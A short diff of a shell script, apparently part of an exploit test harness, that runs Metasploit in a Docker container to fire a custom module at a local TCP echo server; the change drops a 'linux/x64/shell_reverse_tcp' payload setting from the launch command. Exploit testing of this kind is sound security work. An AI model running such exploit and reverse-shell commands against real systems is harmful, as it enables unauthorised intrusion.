@@ -11,4 +11,4 @@ LPORT=5555
 RHOST="$LHOST"
 RPORT=8080
 
-docker run -it -p $LPORT:$LPORT -v $PWD/exploits:/usr/share/metasploit-framework/modules/exploits/custom polyverse-internal.jfrog.io/kali-metasploit msfconsole -x "use exploit/custom/tcp_echo_server.rb; set RHOST $RHOST; set RPORT $RPORT; set LHOST $LHOST; set LPORT $LPORT; set PAYLOAD linux/x64/shell_reverse_tcp"
+docker run -it -p $LPORT:$LPORT -v $PWD/exploits:/usr/share/metasploit-framework/modules/exploits/custom polyverse-internal.jfrog.io/kali-metasploit msfconsole -x "use exploit/custom/tcp_echo_server.rb; set RHOST $RHOST; set RPORT $RPORT; set LHOST $LHOST; set LPORT $LPORT"
